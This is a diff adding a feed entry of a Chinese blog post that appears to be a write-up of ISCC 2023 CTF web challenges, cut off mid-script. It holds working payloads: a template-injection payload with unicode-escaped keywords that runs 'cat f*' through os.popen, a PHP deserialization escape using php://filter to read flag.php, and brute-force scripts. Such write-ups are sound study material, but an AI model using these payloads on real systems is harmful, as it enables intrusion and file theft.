@@ -633,6 +633,1774 @@ public class POC2 &amp;#123;
         <updated>2023-07-09T16:00:00.000Z</updated>
     </entry>
     <entry>
+        <id>https://blog.xcu.icu/2023/06/01/ISCC2023/</id>
+        <title>ISCC2023</title>
+        <link rel="alternate" href="https://blog.xcu.icu/2023/06/01/ISCC2023/"/>
+        <content type="html">&lt;h2 id=&#34;Web&#34;&gt;&lt;a href=&#34;#Web&#34; class=&#34;headerlink&#34; title=&#34;Web&#34;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&#34;羊了个羊&#34;&gt;&lt;a href=&#34;#羊了个羊&#34; class=&#34;headerlink&#34; title=&#34;羊了个羊&#34;&gt;&lt;/a&gt;羊了个羊&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011302664.png&#34; alt=&#34;image-20230501130234361&#34;&gt;&lt;/p&gt;
+&lt;p&gt;网址前加上view-source: 查看源码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011303811.png&#34; alt=&#34;image-20230501130347598&#34;&gt;&lt;/p&gt;
+&lt;p&gt;解码得到flag&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305011304425.png&#34; alt=&#34;image-20230501130419360&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;小周的密码锁&#34;&gt;&lt;a href=&#34;#小周的密码锁&#34; class=&#34;headerlink&#34; title=&#34;小周的密码锁&#34;&gt;&lt;/a&gt;小周的密码锁&lt;/h3&gt;&lt;p&gt;页面上一个参数&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231614225.png&#34; alt=&#34;image-20230523161457189&#34;&gt;&lt;/p&gt;
+&lt;p&gt;隐藏了一个参数，这里在前段写死了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231614271.png&#34; alt=&#34;image-20230523161447232&#34;&gt;&lt;/p&gt;
+&lt;p&gt;尝试修改值，到5的时候看见了源码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231615438.png&#34; alt=&#34;image-20230523161549377&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
+    function MyHashCode($str)
+    &amp;#123;
+        $h = 0;
+        $len = strlen($str);
+        for ($i = 0; $i &amp;lt; $len; $i++) &amp;#123;
+            $hash = intval40(intval40(40 * $hash) + ord($str[$i]));
+        &amp;#125;
+        return abs($hash);
+    &amp;#125;
+    
+    function intval40($code)
+    &amp;#123;
+        $falg = $code &amp;gt;&amp;gt; 32;
+        if ($falg == 1) &amp;#123;
+            $code = ~($code - 1);
+            return $code * -1;
+        &amp;#125; else &amp;#123;
+            return $code;
+        &amp;#125;
+    &amp;#125;
+    function Checked($str)&amp;#123;
+        $p1 = &amp;#39;/ISCC/&amp;#39;;
+        if (preg_match($p1, $str))&amp;#123;
+            return false;
+        &amp;#125;
+        return true;
+    &amp;#125;
+
+    function SecurityCheck($sha1,$sha2,$user)&amp;#123;
+        
+        $p1 = &amp;#39;/^[a-z]+$/&amp;#39;;
+        $p2 = &amp;#39;/^[A-Z]+$/&amp;#39;;
+
+        if (preg_match($p1, $sha1) &amp;amp;&amp;amp; preg_match($p2, $sha2))&amp;#123;
+            $sha1 = strtoupper($sha1);
+            $sha2 = strtolower($sha2);
+            $user = strtoupper($user);
+            $crypto = $sha1 ^ $sha2;
+        &amp;#125;
+        else&amp;#123;
+            die(&amp;quot;wrong&amp;quot;);
+        &amp;#125;       
+
+        return array($crypto, $user);
+    &amp;#125;
+    error_reporting(0);
+    
+    $user = $_GET[&amp;#39;username&amp;#39;];//user
+    $sha1 = $_GET[&amp;#39;sha1&amp;#39;];//sha1
+    $sha2 = $_GET[&amp;#39;‮⁦//sha2⁩⁦sha2&amp;#39;];
+    //‮⁦see me ⁩⁦can you 
+
+    if (isset ($_GET[&amp;#39;password&amp;#39;])) &amp;#123;
+        if ($_GET[&amp;#39;password2&amp;#39;] == 5)&amp;#123;
+            show_source(__FILE__);
+        &amp;#125;
+        else&amp;#123;
+            //Try to encrypt
+            if(isset($sha1) &amp;amp;&amp;amp; isset($sha2) &amp;amp;&amp;amp; isset($user))&amp;#123;
+                [$crypto, $user] = SecurityCheck($sha1,$sha2,$user);
+                if((substr(sha1($crypto),-6,6) === substr(sha1($user),-6,6)) &amp;amp;&amp;amp; (substr(sha1($user),-6,6)) === &amp;#39;a05c53&amp;#39;)&amp;#123;//welcome to ISCC
+                    
+                    if((MyHashcode(&amp;quot;ISCCNOTHARD&amp;quot;) === MyHashcode($_GET[&amp;#39;password&amp;#39;]))&amp;amp;&amp;amp;Checked($_GET[&amp;#39;password&amp;#39;]))&amp;#123;
+                        include(&amp;quot;f1ag.php&amp;quot;);
+                        echo $flag;
+                    &amp;#125;else&amp;#123;
+                        die(&amp;quot;就快解开了!&amp;quot;);
+                    &amp;#125;
+                    
+                &amp;#125;
+                else&amp;#123;
+                    die(&amp;quot;真的想不起来密码了吗?&amp;quot;);
+                &amp;#125;
+            &amp;#125;else&amp;#123;
+                die(&amp;quot;密钥错误!&amp;quot;);
+            &amp;#125;
+        &amp;#125;    
+    &amp;#125;        
+
+    mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 1e4) + rand(1, 1e4));
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里有Unicode标准中定义的控制字符，这里传入&amp;#x2F;&amp;#x2F;sha2%E2%81%A9%E2%81%A6sha2即可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231623339.png&#34; alt=&#34;image-20230523162310303&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里判断sha1大写，sha2小写异或后得到crypto，这里先将所有可能获取&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
+
+$str1=&amp;#39;abcdefghijklmnopqrstuvwxyz&amp;#39;;
+$str2=&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;;
+for ($i=0;$i&amp;lt;strlen($str1);$i++)&amp;#123;
+    for ($j=0;$j&amp;lt;strlen($str2);$j++)&amp;#123;
+
+        echo &amp;quot;$str1[$i]和$str2[$j]=====&amp;quot;;
+        echo $str1[$i]^$str2[$j];
+        echo &amp;quot;\n&amp;quot;;
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231656335.png&#34; alt=&#34;image-20230523165640284&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里能用的可见字符大概是#“%$’&amp;amp;)(+*-,&amp;#x2F;.1032547698;!，用这几个字符爆破一下得到一个后6位达到题目要求的&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
+$string = &amp;#39;#\&amp;quot;%$\&amp;#39;&amp;amp;)(+*-,/.1032547698!;&amp;#39;;
+$targetHash = &amp;#39;a05c53&amp;#39;;
+
+for ($i = 0; $i &amp;lt; 999999999999999; $i++) &amp;#123;
+    $randomString = &amp;#39;&amp;#39;;
+    $length = mt_rand(0, 9);
+
+    for ($j = 0; $j &amp;lt; $length; $j++) &amp;#123;
+        $randomChar = $string[mt_rand(0, strlen($string) - 1)];
+        $randomString .= $randomChar;
+    &amp;#125;
+
+    if (substr(sha1($randomString), -6) === $targetHash) &amp;#123;
+        echo $randomString . &amp;quot;\n&amp;quot;;
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231710538.png&#34; alt=&#34;image-20230523171014503&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里选用一个最短的79;4”找到对应的字符，sha1&amp;#x3D;aaaaa&amp;amp;sha2&amp;#x3D;VXZUC&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231626044.png&#34; alt=&#34;image-20230523162613992&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里sha1和user的值sha后，后6位相同同时为a05c53&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
+for($i=0;$i&amp;lt;9999999999;$i++)&amp;#123;
+    if(substr(sha1($i),-6,6)==&amp;quot;a05c53&amp;quot;)&amp;#123;
+        echo $i;
+        echo &amp;quot;\n&amp;quot;;
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231631214.png&#34; alt=&#34;image-20230523163133178&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这些值都满足条件，取其一即可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231714457.png&#34; alt=&#34;image-20230523171458413&#34;&gt;&lt;/p&gt;
+&lt;p&gt;最后一个if&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231628079.png&#34; alt=&#34;image-20230523162841005&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里通过MyHashcode和checked检查password&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231716616.png&#34; alt=&#34;image-20230523171602567&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231716018.png&#34; alt=&#34;image-20230523171613926&#34;&gt;&lt;/p&gt;
+&lt;p&gt;不能包含ISCC，这里还是暴力一点，写一个脚本爆破一下&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
+error_reporting(0);
+function MyHashCode($str)
+&amp;#123;
+    $h = 0;
+    $len = strlen($str);//11 //字符串长度
+    for ($i = 0; $i &amp;lt; $len; $i++) &amp;#123;
+        $hash = intval40(intval40(40 * $hash) + ord($str[$i])); //40次哈希
+    &amp;#125;
+    return abs($hash); //取绝对值
+&amp;#125;
+
+function intval40($code) //40位整数
+&amp;#123;
+    $falg = $code &amp;gt;&amp;gt; 32; //判断是否为负数
+    if ($falg == 1) &amp;#123; //如果是负数
+        $code = ~($code - 1); //取反加一
+        return $code * -1; //取负数
+    &amp;#125; else &amp;#123;
+        return $code; //正数
+    &amp;#125;
+&amp;#125;
+
+$length = 4; // 指定生成的随机字符的位数
+for ($j=0;$j&amp;lt;99999999;$j++) &amp;#123;
+    $randomString = &amp;#39;&amp;#39;;
+    for ($i = 0; $i &amp;lt; $length; $i++) &amp;#123;
+        $randomChar = chr(mt_rand(0, 255));
+        $randomString .= $randomChar;
+    &amp;#125;
+    $randomString=urlencode($randomString);
+//    echo urlencode($randomString).&amp;quot;\n&amp;quot;;
+    if (MyHashcode(&amp;quot;ISCC&amp;quot;)===MyHashcode(urldecode($randomString)))&amp;#123;
+        echo $randomString.&amp;quot;\n&amp;quot;;
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231823503.png&#34; alt=&#34;image-20230523182344443&#34;&gt;&lt;/p&gt;
+&lt;p&gt;最后的payload&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;http://47.94.14.162:10008/?password=K%00%B8%BBNOTHARD&amp;amp;username=14987637&amp;amp;sha1=aaaaa&amp;amp;%E2%80%AE%E2%81%A6//sha2%E2%81%A9%E2%81%A6sha2=VXZUC
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231827603.png&#34; alt=&#34;image-20230523182758546&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;老狼老狼几点了&#34;&gt;&lt;a href=&#34;#老狼老狼几点了&#34; class=&#34;headerlink&#34; title=&#34;老狼老狼几点了&#34;&gt;&lt;/a&gt;老狼老狼几点了&lt;/h3&gt;&lt;p&gt;这个时间因为信息很少，只能去尝试一下时间&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231831475.png&#34; alt=&#34;image-20230523183128437&#34;&gt;&lt;/p&gt;
+&lt;p&gt;最后发现输入12会跳转到guess_time.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;php&#34;&gt; &amp;lt;?php
+//&amp;quot;Hello! welcome to ISCC, wish you have a great time!&amp;quot;;
+header(&amp;quot;Content-type:text/html;charset=utf-8&amp;quot;);
+error_reporting(0);
+echo time();
+
+class what_time_is_it&amp;#123;
+    protected $func, $target;
+
+    public function __construct($show_time)&amp;#123;
+        $this-&amp;gt;func = $show_time;
+    &amp;#125;
+
+    public function __wakeup()&amp;#123;
+        echo &amp;quot;wakeup&amp;quot;;
+    &amp;#125;
+
+    public function call_func()&amp;#123;
+        $lets_show_time = unserialize($this-&amp;gt;filter($this-&amp;gt;func));
+        if($lets_show_time[&amp;#39;function&amp;#39;] == &amp;quot;show_time&amp;quot;)&amp;#123;
+            echo &amp;#39;The time is: &amp;quot;. date(&amp;quot;h:i:sa&amp;quot;, time()). &amp;quot;&amp;lt;br&amp;gt;&amp;#39;;
+        &amp;#125;
+        else if($lets_show_time[&amp;#39;function&amp;#39;] == &amp;quot;hack&amp;quot;)&amp;#123;
+            file_put_contents(&amp;#39;time.php&amp;#39;, &amp;quot;&amp;lt;?php echo &amp;#39;The time is: &amp;quot;. date(&amp;quot;h:i:sa&amp;quot;, time()). &amp;quot;&amp;lt;br&amp;gt;&amp;#39;;&amp;quot;);
+            echo &amp;quot;做撚啊做，你还是看看时间吧&amp;quot;;
+            include($lets_show_time[&amp;#39;file&amp;#39;]);
+        &amp;#125;
+        else
+            highlight_file(__file__);
+    &amp;#125;
+
+    private function filter($s)&amp;#123;
+        return preg_replace(&amp;#39;/base64/i&amp;#39;,&amp;#39;&amp;#39;, $s);
+    &amp;#125;
+
+    public function __destruct()&amp;#123;
+        $this-&amp;gt;call_func();
+    &amp;#125;
+
+&amp;#125;
+
+if($_SESSION) unset($_SESSION);
+$p1 = $_POST[&amp;#39;param1&amp;#39;];
+$p2 = $_POST[&amp;#39;param2&amp;#39;];
+$_SESSION[&amp;#39;function&amp;#39;] = isset($_GET[&amp;#39;func&amp;#39;]) ? $_GET[&amp;#39;func&amp;#39;] : &amp;quot;highlight_file&amp;quot;;
+$_SESSION[&amp;#39;file&amp;#39;] = &amp;#39;time.php&amp;#39;;
+if ($p1 !== $p2 &amp;amp;&amp;amp; md5($p1) === md5($p2))&amp;#123;
+    if (substr($p1, 0, 10) === strval(time()))&amp;#123;
+        echo &amp;quot;Just the time&amp;quot;;
+        extract($_POST);
+        $_SESSION[&amp;#39;file&amp;#39;] = &amp;#39;time.php&amp;#39;;
+        $_SESSION[&amp;#39;function&amp;#39;] = &amp;quot;show_time&amp;quot;;
+    &amp;#125;
+    else&amp;#123;
+        echo &amp;quot;Sorry wrong time!&amp;quot;;
+    &amp;#125;
+&amp;#125;
+$let_me_show_time = serialize($_SESSION).&amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
+$a = new what_time_is_it($let_me_show_time);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;先看if&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231837124.png&#34; alt=&#34;image-20230523183745040&#34;&gt;&lt;/p&gt;
+&lt;p&gt;md5强碰撞，且$p1前10位等于当前时间戳这里使用fastcoll工具来生成&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NodWFpY2VuZ2xvdTMwMzIvYXJ0aWNsZS9kZXRhaWxzLzExODE5NzkwNA==&#34;&gt;(78条消息) 使用fastcoll生成字符串MD5碰撞_KogRow的博客-CSDN博客&lt;/span&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php 
+function readmyfile($path)&amp;#123;
+$fh = fopen($path, &amp;quot;rb&amp;quot;);
+$data = fread($fh, filesize($path));
+fclose($fh);
+return $data;
+&amp;#125;
+system(&amp;quot;E:\\webtools\\fastcoll_v1.0.0.5\\fastcoll_v1.0.0.5.exe ./1.txt&amp;quot;);
+$a = urlencode(readmyfile(&amp;quot;./1_msg2.txt&amp;quot;));
+$b = urlencode(readmyfile(&amp;quot;./1_msg1.txt&amp;quot;));
+unlink(&amp;quot;./1_msg2.txt&amp;quot;);
+unlink(&amp;quot;./1_msg1.txt&amp;quot;);
+echo &amp;quot;\n&amp;quot;;
+// if(md5((string)urldecode($a))===md5((string)urldecode($b)))&amp;#123;
+// echo $a.&amp;quot;\n&amp;quot;;
+// &amp;#125;
+// if(urldecode($a)!=urldecode($b))&amp;#123;
+// echo $b;
+// &amp;#125;
+echo &amp;quot;param1=$a&amp;amp;param2=$b&amp;quot;;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231856255.png&#34; alt=&#34;image-20230523185624197&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231906896.png&#34; alt=&#34;image-20230523190635845&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231907404.png&#34; alt=&#34;image-20230523190731282&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里进入了这个if，所以需要让$_session[‘function’]不等于’show_time’而等于hack&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305231911998.png&#34; alt=&#34;image-20230523191103945&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里是用extract函数接受post参数，直接变量覆盖，然后利用文件包含去读文件，利用base64进行字符串逃逸&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php 
+function readmyfile($path)&amp;#123;
+$fh = fopen($path, &amp;quot;rb&amp;quot;);
+$data = fread($fh, filesize($path));
+fclose($fh);
+return $data;
+&amp;#125;
+system(&amp;quot;E:\\webtools\\fastcoll_v1.0.0.5\\fastcoll_v1.0.0.5.exe ./1.txt&amp;quot;);
+$a = urlencode(readmyfile(&amp;quot;./1_msg2.txt&amp;quot;));
+$b = urlencode(readmyfile(&amp;quot;./1_msg1.txt&amp;quot;));
+unlink(&amp;quot;./1_msg2.txt&amp;quot;);
+unlink(&amp;quot;./1_msg1.txt&amp;quot;);
+echo &amp;quot;\n&amp;quot;;
+// if(md5((string)urldecode($a))===md5((string)urldecode($b)))&amp;#123;
+// echo $a.&amp;quot;\n&amp;quot;;
+// &amp;#125;
+// if(urldecode($a)!=urldecode($b))&amp;#123;
+// echo $b;
+// &amp;#125;
+echo &amp;quot;param1=$a&amp;amp;param2=$b&amp;amp;_SESSION[a]=base64base64base64&amp;amp;_SESSION[aaa]=;s:4:\&amp;quot;file\&amp;quot;;s:62:\&amp;quot;php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php\&amp;quot;;s:8:\&amp;quot;function\&amp;quot;;s:4:\&amp;quot;hack\&amp;quot;;s:8:\&amp;quot;function\&amp;quot;;s:4:\&amp;quot;hack\&amp;quot;;&amp;#125;&amp;quot;;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;最后的payload&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;param1=1684843960%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%CA%BF%D7%60%1F6rcJ%9F%85%C7L%9CP%E6%26%B5C%E0%2F%12Z%F62Jy%F9%10%92%26%C3%93%0B%C1%E1%E8%E3%11%C1%C7%BF%BA%22%15%9E%1D%0D%8CRM%3A%7Cv%C8%FE%5E%F6P%24%DB%E4%D1L%04%0B%ED%22E%CAA%0F%E1%A3%FB%07%B1%8C%D2%8F%C6J%A9%FA%F8%F9%60U%CD%17%18%C5%5D%19%5D%B2%3B%29%DF%D6Y%B9%AD%07%85%8F%C0%AF%B0%91z%EC%DF%2C%03%AC%FCS%00b%AB%D4%23%C4S%DB%3Dg&amp;amp;param2=1684843960%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%CA%BF%D7%60%1F6rcJ%9F%85%C7L%9CP%E6%26%B5C%60%2F%12Z%F62Jy%F9%10%92%26%C3%93%0B%C1%E1%E8%E3%11%C1%C7%BF%BA%22%15%1E%1D%0D%8CRM%3A%7Cv%C8%FE%5E%F6P%A4%DB%E4%D1L%04%0B%ED%22E%CAA%0F%E1%A3%FB%07%B1%8C%D2%8F%C6J%A9z%F8%F9%60U%CD%17%18%C5%5D%19%5D%B2%3B%29%DF%D6Y%B9%AD%07%85%8F%C0%AF%B0%11%7B%EC%DF%2C%03%AC%FCS%00b%AB%D4%23DS%DB%3Dg&amp;amp;_SESSION[a]=base64base64base64&amp;amp;_SESSION[aaa]=;s:4:&amp;quot;file&amp;quot;;s:62:&amp;quot;php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php&amp;quot;;s:8:&amp;quot;function&amp;quot;;s:4:&amp;quot;hack&amp;quot;;s:8:&amp;quot;function&amp;quot;;s:4:&amp;quot;hack&amp;quot;;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305232013022.png&#34; alt=&#34;image-20230523201305959&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;ChatGGG&#34;&gt;&lt;a href=&#34;#ChatGGG&#34; class=&#34;headerlink&#34; title=&#34;ChatGGG&#34;&gt;&lt;/a&gt;ChatGGG&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305232044091.png&#34; alt=&#34;image-20230523204412046&#34;&gt;&lt;/p&gt;
+&lt;p&gt;很有意思的一个题，很明显是模版注入，这里过滤了不少字符,大概差不多就下面这些&lt;/p&gt;
+&lt;p&gt;waf：_，class，or，+，*，init，base，global，builtin，.&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305232050135.png&#34; alt=&#34;image-20230523205058089&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里得到提示，就在fllaaag.txt里面，那么就很明显了，这里只要想办法绕过即可，关键字几乎都被过滤，这里考虑使用编码绕过,点号被过滤使用attr绕过&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305240123856.png&#34; alt=&#34;image-20230524012330774&#34;&gt;&lt;/p&gt;
+&lt;p&gt;成功了，这里开始构建payload&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;&amp;#123;%print(((((((((&#34;&#34;|attr(&#34;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#34;))|attr(&#34;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&#34;))|attr(&#34;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#34;))()|attr(140))|attr(&#34;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&#34;))|attr(&#34;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#34;)))|attr(&#34;\u0067\u0065\u0074&#34;)(&#34;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#34;))|attr(&#34;\u0067\u0065\u0074&#34;)(&#34;\u0065\u0076\u0061\u006c&#34;)(&#34;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u0063\u0061\u0074\u0020\u0066\u002a\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&#34;))%&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305240122699.png&#34; alt=&#34;image-20230524012238588&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;ISCC疯狂购物节-1&#34;&gt;&lt;a href=&#34;#ISCC疯狂购物节-1&#34; class=&#34;headerlink&#34; title=&#34;ISCC疯狂购物节-1&#34;&gt;&lt;/a&gt;ISCC疯狂购物节-1&lt;/h3&gt;&lt;p&gt;这里先注册登录后发现这里名字经过编码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305241149473.png&#34; alt=&#34;image-20230524114902422&#34;&gt;&lt;/p&gt;
+&lt;p&gt;阿里嘎多美羊羊桑，这里寻找解码后美羊羊的值&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import time
+import parsel
+import requests
+import base64
+import re
+
+
+def extract_info(html):
+    # 提取描述信息
+    description_match = re.search(r&amp;#39;&amp;lt;h5&amp;gt;描述:&amp;amp;nbsp&amp;amp;nbsp(.+?)&amp;lt;/h5&amp;gt;&amp;#39;, html)
+    description = description_match.group(1).strip() if description_match else &amp;quot;无描述信息&amp;quot;
+
+    # 提取颜值信息
+    yanzhi_match = re.search(r&amp;#39;魅力值:&amp;lt;span style=&amp;quot;color: red;&amp;quot;&amp;gt;(.+?)&amp;lt;/span&amp;gt;&amp;#39;, html)
+    yanzhi = yanzhi_match.group(1).strip() if yanzhi_match else &amp;quot;无颜值信息&amp;quot;
+
+    # 提取智慧值
+    wisdom_match = re.search(r&amp;#39;智慧值:&amp;lt;span&amp;gt;(.+?)&amp;lt;/span&amp;gt;&amp;#39;, html)
+    wisdom_value = wisdom_match.group(1).strip() if wisdom_match else &amp;quot;无智慧值信息&amp;quot;
+
+    # 提取体力值
+    strength_match = re.search(r&amp;#39;体力值:&amp;lt;span&amp;gt;(.+?)&amp;lt;/span&amp;gt;&amp;#39;, html)
+    strength_value = strength_match.group(1).strip() if strength_match else &amp;quot;无体力值信息&amp;quot;
+
+    # 提取爱情值
+    love_match = re.search(r&amp;#39;爱情值:&amp;lt;span&amp;gt;(.+?)&amp;lt;/span&amp;gt;&amp;#39;, html)
+    love_value = love_match.group(1).strip() if love_match else &amp;quot;无爱情值信息&amp;quot;
+
+    # 返回提取的信息
+    return &amp;#123;
+        &amp;#39;描述&amp;#39;: base64.b64decode(description).decode(&amp;#39;utf-8&amp;#39;),
+        &amp;#39;颜值&amp;#39;: yanzhi,
+        &amp;#39;智慧值&amp;#39;: wisdom_value,
+        &amp;#39;体力值&amp;#39;: strength_value,
+        &amp;#39;爱情值&amp;#39;: love_value
+    &amp;#125;
+
+
+bulei=&amp;#39;&amp;#39;
+max=0
+id=&amp;#39;&amp;#39;
+name=&amp;#39;&amp;#39;
+for i in range(1,999999):
+    url=&amp;quot;http://47.94.14.162:10001/Details/search?id=&amp;#123;&amp;#125;&amp;quot;.format(i)
+    print(url)
+    cookie = &amp;#123;
+        &amp;#39;csrftoken&amp;#39;: &amp;#39;qk1ya0UNlGvPeAQjKYmLl8To2D8UL2T28WJ1xUYxTc5PRqgB8i2VXXTbLxY3ONvY&amp;#39;,
+        &amp;#39;PHPSESSID&amp;#39;: &amp;#39;v6q21f2a4m8udue4664j1ooh5u&amp;#39;,
+        &amp;#39;Auth_Key&amp;#39;: &amp;#39;XxA8UIdzpPzCjX%2FdPFgGgg%3D%3D&amp;#39;,
+        &amp;#39;Cyber_info&amp;#39;: &amp;#39;GODICWnAlGHG5KhM%2F%2Bl%2FmDL%2FT%2B%2FM%2B3Y06%2BvUFqxxpq4W4KmKr8C0rizMmoIfZJnweV4VafZ7iLVEXGWmgB95%2BUIRceCkk5gY2BI9bX9E%2F9Q%3D&amp;#39;,
+        &amp;#39;sessionid&amp;#39;: &amp;#39;o0ovlujwnxex4j6uku6xe82xzskdm8yr&amp;#39;,
+        &amp;#39;messages&amp;#39;: &amp;#39;.eJyLjlaKj88qzs-Lz00tLk5MT1XSMdAxMdBRUogpNTVONoopNTM1N4gptTQ1tIwptUhKTVNUitUZhppiAe3zT6I:1q1djr:BifAVF-RDnVlwPGPehNqAZGpFPcISil7vJyaqsaJnvQ&amp;#39;
+    &amp;#125;
+    header=&amp;#123;
+        &amp;quot;Cache-Control&amp;quot;: &amp;quot;max-age=0&amp;quot;,
